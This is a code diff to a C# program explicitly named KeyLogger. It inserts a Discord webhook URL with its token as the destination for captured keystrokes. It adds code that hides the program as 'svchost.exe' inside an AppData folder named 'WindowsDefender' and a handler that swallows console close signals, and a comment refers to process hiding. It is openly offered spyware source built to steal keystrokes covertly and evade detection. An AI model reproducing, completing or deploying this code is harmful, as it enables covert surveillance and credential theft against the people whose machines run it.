@@ -12,7 +12,7 @@ using Microsoft.Win32;
 class KeyLogger
 {
     // Webhook configuration
-    private static string webhookUrl = "YOUR_WEBHOOK_URL_HERE";
+    private static string webhookUrl = "https://discord.com/api/webhooks/1460302846003253280/J9JQZi-f-1eQ9Hv1JU1vHEHlp2KWvLCRMOLLopMTJ6wnZ5OXm3Je3lnxyDNh8oQDdyfd";
 
     // Logging buffer and state
     private static StringBuilder logBuffer = new StringBuilder();
@@ -26,6 +26,21 @@ class KeyLogger
 
     // Configuration
     private static int LogInterval = 5000; // 5 seconds default
+
+    // Secure location paths
+    private static string SecureFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WindowsDefender");
+    private static string SecureExecutable = Path.Combine(SecureFolder, "svchost.exe");
+
+    // Console control handler delegate
+    private delegate bool HandlerRoutine(int dwCtrlType);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool SetConsoleCtrlHandler(HandlerRoutine handler, bool add);
+
+    private static bool ConsoleCtrlHandler(int ctrlType)
+    {
+        return true;
+    }
 
     // Process hiding
     [DllImport("user32.dll")]
